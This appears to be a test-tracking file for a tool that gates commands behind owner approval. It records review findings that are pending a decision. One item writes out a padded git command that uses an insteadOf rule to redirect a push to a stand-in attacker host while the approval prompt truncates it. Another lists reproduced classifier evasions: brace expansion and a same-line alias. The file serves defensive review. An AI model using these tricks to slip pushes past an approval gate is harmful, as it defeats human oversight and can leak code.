---
status: testing
phase: 04-profiles-retrieval-budgets-restricted-mode-and-the-portabili
source: [04-VERIFICATION.md]
started: 2026-11-23T00:00:00Z
updated: 2026-11-23T00:00:00Z
---

## Current Test

number: 1
name: GCR-01 — approval prompt hides part of long bound values
expected: |
  The owner decides whether `avarice approve` must show every value it binds. Today `paramsSummary` cuts each bound value at 80 characters, so a padded `git -c core.x=<80 chars> -c url.https://evil.example/.insteadOf=… push origin main` prints `gitOptions=-c core.x=aaaa…` and `evil.example` never appears, although the digest binds the full line. Either accept it as a recorded residual, or rule it a gap (fix: refuse to bind a value longer than the display cap, or print the full values).
awaiting: user response

## Tests

### 1. GCR-01 — approval prompt hides part of long bound values
expected: Owner decision: accept as a recorded residual, or convert to a gap and fix (refuse to bind a value longer than the 80-character display cap, or print full values). See 04-REVIEW-GAPS.md GCR-01 and 04-VERIFICATION.md.
result: [pending]

### 2. Triage 04-REVIEW-GAPS.md
expected: Every finding of the incremental review of the gap changes (1 critical, 7 warnings, 5 info) has a recorded disposition (fixed, deferred with a target, or skipped with a reason). The verifier reproduced GWR-01 (`gh pr -R x/y create` not classified), GWR-02 (brace expansion `git pus{h,}`) and GWR-03 (same-line alias `git -c alias.p=push p`); GWR-04 to GWR-07 were not run.
result: [pending]

### 3. AC-8 spot-check of runs T01-B, T04-C and T05-A
expected: A person reads each run's diff and judges that it really solves its task (the judge's verdict is automated; the semantic correctness is not).
result: [pending]

### 4. Node 22.22.3 test leg
expected: The test suite passes on Node 22.22.3 (only the Node 26 leg was recorded, in 04-34; Node 22 is not runnable in the execution environment).
result: [pending]

### 5. Committed 04-36-evidence/ before a public push
expected: The owner decides whether the committed `04-36-evidence/` (278 files, about 45 MB, with private source in transcripts) may go to the public origin with the phase PR, or must be removed or moved first.
result: [pending]

## Summary

total: 5
passed: 0
issues: 0
pending: 5
skipped: 0
blocked: 0

## Gaps
